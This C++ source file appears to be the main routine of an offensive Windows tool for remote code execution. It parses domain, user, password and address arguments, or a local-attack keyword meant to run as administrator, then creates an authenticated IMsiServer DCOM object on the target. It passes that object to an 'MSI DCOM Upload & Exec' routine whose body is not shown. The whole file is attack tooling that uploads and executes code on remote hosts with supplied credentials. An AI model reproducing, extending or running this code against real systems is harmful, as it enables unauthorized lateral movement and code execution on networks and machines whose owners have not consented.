#include "Includes.h"
#include "Utils.h"

HRESULT MsiUploadExec(IUnknown* pIMsiServerAuthen, COAUTHINFO* pAuthInfo);

static void PrintUsage(const wchar_t* programName) {
	std::wcout << L"Usage: " << programName << L" [domain]\\[user]:[password]@[address]" << std::endl;
	std::wcout << L"Local Usage: " << programName << L" " << LOCAL_ATTACK_KEYWORD << L" (Run this as administrator)" << std::endl;
}

int wmain(int argc, wchar_t* argv[]) {

    std::wstring domain, user, password, address;
    if (argc < 2 || !parseArgument(argv[1], domain, user, password, address)) {
		PrintUsage(argv[0]);
        return -1;
    }

	IUnknown* pIMsiServer = nullptr;
	COAUTHINFO authInfo{};
	COAUTHIDENTITY authId{};
	HRESULT hr;
	 
	ComUtils::InitAuthStructs(&authId, &authInfo, domain, user, password);
	CLSCTX comCtx = address.empty() ? CLSCTX_LOCAL_SERVER : CLSCTX_REMOTE_SERVER;
	pIMsiServer = ComUtils::CreateObject(CLSID_MsiServer, IID_IMsiSever, comCtx, address, &authInfo);

	if (!pIMsiServer)
	{
		std::wcout << L"[-] ERROR: 0x" << std::hex << GetLastError() << L" While creating an IMsiServer on " << argv[1] << std::endl;
		return -1;
	}

	IUnknown* pIMsiServerAuthen = nullptr;
	
	hr = ComUtils::SetupAuthOnParentIUnknownCastToIID(pIMsiServer, &authInfo, &pIMsiServerAuthen, IID_IMsiSever);
	if (!pIMsiServerAuthen)
	{
		std::wcout << L"[-] ERROR: 0x" << std::hex << hr << L" Setting authentication on created IMsiServer" << std::endl;
		return -1;
	}

	std::wcout << L"[+] Created an authenticated IMsiServer on " << argv[1] << std::endl;

	// the MSI DCOM Upload & Exec logic 
	return MsiUploadExec(pIMsiServerAuthen,&authInfo);
}
